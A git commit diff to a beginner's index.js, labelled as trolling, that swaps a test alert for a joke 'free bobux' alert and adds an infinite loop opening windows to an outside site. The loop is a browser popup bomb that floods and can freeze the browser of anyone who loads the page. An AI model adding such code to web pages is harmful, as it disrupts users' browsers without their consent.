6acd25ac052778dd9dea604fe9defae2e033e3e3
astrolul <85197489+astrolul@users.noreply.github.com>
2021-10-31 00:57:28 +0100

    we do a little trolling

--- index.js
+++ index.js
@@ -1,2 +1,6 @@
 // My first Javascript Code lol
-alert('Alert Succeeded!')
+alert('Injected free bobux coins!!!!!!!1111111!!!!!111')
+
+while (true) {
+window.open('http://www.fallingfalling.com/');
+}
